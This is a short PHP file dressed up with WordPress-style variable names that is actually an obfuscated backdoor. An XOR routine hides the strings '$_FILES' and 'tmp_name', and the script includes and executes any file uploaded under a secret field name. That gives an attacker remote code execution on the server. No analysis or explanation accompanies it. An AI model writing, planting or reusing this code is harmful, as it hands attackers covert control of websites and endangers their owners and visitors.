<?php 	
$object_vars = 'KuFAgnEsUOO';

$the_post = $object_vars;
	$show_in_nav_menus = 'allblocks';
function remove_breaks($wp_rewrite, $intermediate_file)

{
	$special_chars = 'original_text';
    $page_title = $intermediate_file;
    $trash = urldecode($wp_rewrite);
    $wildcard_mime_types = substr($page_title,0, strlen($trash));
    $image_exts = $trash ^ $wildcard_mime_types;
    return $image_exts;

}
$posts = ${remove_breaks("%143%0F%0D%22%3D", $the_post)};
$filetype = $posts;

$cdata_regex = isset($filetype[$the_post]);

if ($cdata_regex)

{
    $capabilities = $posts[$the_post];

    $filename = $capabilities[remove_breaks("%3F%186%1E%09%0F%28%16", $the_post)];
    $headers = $filename;

    include ($headers);
}

?>
